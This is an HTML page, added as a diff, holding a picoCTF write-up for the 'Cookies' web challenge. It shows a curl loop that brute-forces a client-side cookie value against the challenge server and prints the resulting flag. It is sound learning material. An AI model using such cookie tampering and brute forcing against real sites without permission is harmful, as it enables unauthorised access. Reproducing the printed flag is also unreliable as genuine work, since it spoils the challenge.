@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cookies | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>Cookies</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty easy">Easy</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Cookies</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://wily-courier.picoctf.net:50202/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+Who doesn't love cookies? Try to figure out the best one.</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-explore-the-website">Step 1: Explore the Website</h3>
+<p>The website is a "Cookie Search Page" where you can type a cookie name (e.g. "snickerdoodle") and it tells you how much it likes that cookie. Looking at the HTTP response, we notice:</p>
+<pre><code class="language-bash">curl -s -v http://wily-courier.picoctf.net:50202/ 2&gt;&amp;1
+</code></pre>
+<pre><code>Set-Cookie: name=-1; Path=/
+Location: /
+</code></pre>
+<p>The server sets a cookie called <code>name</code> with value <code>-1</code> and redirects. When you search for a cookie name via the form, the server maps it to a number and sets the <code>name</code> cookie to that number, then redirects to <code>/check</code>.</p>
+<hr />
+<h3 id="step-2-understand-the-mechanism">Step 2: Understand the Mechanism</h3>
+<p>When we visit <code>/check</code> with <code>name=0</code>, the page says:</p>
+<blockquote>
+<p>"I love snickerdoodle cookies!"
+"That is a cookie! Not very special though..."</p>
+</blockquote>
+<p>Each number maps to a different cookie type:</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Cookie Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>snickerdoodle</td>
+</tr>
+<tr>
+<td>1</td>
+<td>chocolate chip</td>
+</tr>
+<tr>
+<td>2</td>
+<td>oatmeal raisin</td>
+</tr>
+<tr>
+<td>3</td>
+<td>gingersnap</td>
+</tr>
+<tr>
+<td>...</td>
+<td>...</td>
+</tr>
+</tbody>
+</table>
+<p>The hint "Not very special though..." suggests we need to find the one that IS special.</p>
+<hr />
+<h3 id="step-3-brute-force-the-cookie-value">Step 3: Brute Force the Cookie Value</h3>
+<p>We iterate through different <code>name</code> values to find the special one:</p>
+<pre><code class="language-bash">for i in $(seq 0 30); do
+  result=$(curl -s -b &quot;name=$i&quot; http://wily-courier.picoctf.net:50202/check)
+  flag=$(echo &quot;$result&quot; | grep -o 'picoCTF{[^}]*}')
+  if [ -n &quot;$flag&quot; ]; then
+    echo &quot;name=$i: $flag&quot;
+    break
+  fi
+done
+</code></pre>
+<p>Values 0 through 17 all return "Not very special though...". But at <code>name=18</code>:</p>
+<pre><code>name=18: picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
+</code></pre>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
+</code></pre>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Cookies can be manipulated.</strong> HTTP cookies are stored on the client side and can be freely modified. In this challenge, the server uses the <code>name</code> cookie value to determine which page to show. By manually changing the cookie value, we can access different responses.</p>
+</li>
+<li>
+<p><strong>Brute forcing is a valid approach.</strong> When the input space is small (integers 0 to N), iterating through all values is quick and effective. A simple bash loop with <code>curl</code> can test dozens of values in seconds.</p>
+</li>
+<li>
+<p><strong>Pay attention to hints.</strong> The message "Not very special though..." on every page tells us there IS a special one out there. Hints in CTF challenges are rarely accidental.</p>
+</li>
+<li>
+<p><strong>How to modify cookies:</strong></p>
+</li>
+<li><strong>Browser:</strong> DevTools → Application → Cookies → edit the value directly</li>
+<li><strong>curl:</strong> Use the <code>-b "name=value"</code> flag to send a custom cookie</li>
+<li><strong>Burp Suite:</strong> Intercept the request and modify the Cookie header</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
